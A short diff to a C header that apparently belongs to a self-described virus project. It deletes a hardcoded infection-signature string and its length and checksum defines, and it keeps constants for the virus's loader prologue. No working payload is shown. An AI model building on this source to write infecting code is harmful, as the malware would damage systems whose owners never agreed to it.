@@ -12,12 +12,8 @@
 # include "accessors.h"
 
 /*
-** hardcoded signature for
-** "Warning : Copyrighted Virus by __UNICORNS_OF_THE_APOCALYPSE__ <3"
+** virus idetifier
 */
-
-# define SIGNATURE_LEN		64
-# define SIGNATURE_CKSUM	0x1526
 
 # define LOADER_PROLOGUE_LEN	22
 # define LOADER_PROLOGUE_SUM	0x6e3
